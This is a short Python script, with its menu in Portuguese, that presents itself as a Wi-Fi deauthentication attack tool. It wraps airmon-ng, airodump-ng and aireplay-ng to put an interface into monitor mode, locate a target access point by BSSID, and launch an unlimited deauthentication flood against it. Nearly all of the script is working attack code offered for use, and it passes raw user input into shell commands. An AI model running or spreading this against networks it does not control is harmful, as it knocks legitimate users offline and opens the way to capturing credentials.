import os 

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RESET = '\033[0m'

interface = ""

while True:
    print ( RED + """

             _..---..__
           ,'          `-.
          .'` .          )             DTT-00AK2
          |     `;.__.._.'               V.1.0
           \ .`--.(##)(#).    Wi-Fi deauthentication attack 
            `-->;--' pWq`>              BY:AND3R
              < <"v\,,,,]
               `\`^-''''7
                 `~"--^-'


    """ + RESET)
    print(RED + "1-[airmon-ng] colocar a interface em modo monitor" + RESET)
    print(YELLOW +"2-[airodump-ng] analisar o tráfego de redes sem fio"+ RESET)
    print(RED + "3-[airodump-ng] filtrar os resultados pelo BSSID" + RESET)
    print(YELLOW +"4-[aireplay-ng] realizar ataque no ponto de acesso (AP)"+ RESET)
    print(RED + "5- Sair" + RESET)
    menu = input( RED + "Digite uma opção>>" + RESET)

    if menu == "1":
     os.system("airmon-ng")
     interface = input("Digite aqui qual interface utilizar:")
     os.system(f"airmon-ng start {interface}")

    elif menu == "2":
        interface = input( GREEN +"Digite a interface:" + RESET)
        os.system(f'xterm -e airodump-ng "{interface}"')
        os.system('clear')

    elif menu == "3": 
        channel = input( GREEN +"Digite o canal:" + RESET)
        bssid = input( GREEN +"Digite a bssid:" + RESET)
        interface = input( GREEN +"Digite a interface:" + RESET)
        os.system('clear')
        os.system(f'xterm -e airodump-ng -c {channel} --bssid {bssid} {interface}')
        os.system('clear')

    elif menu == "4":
        bssid = input( GREEN +"Digite a bssid:" + RESET)
        interface = input( GREEN +"Digite a interface:" + RESET)
        os.system(f'xterm -e aireplay-ng  --deauth 0 -a {bssid} {interface}')
    elif menu == "5":
        break

    else:
        print ("Opção inválida")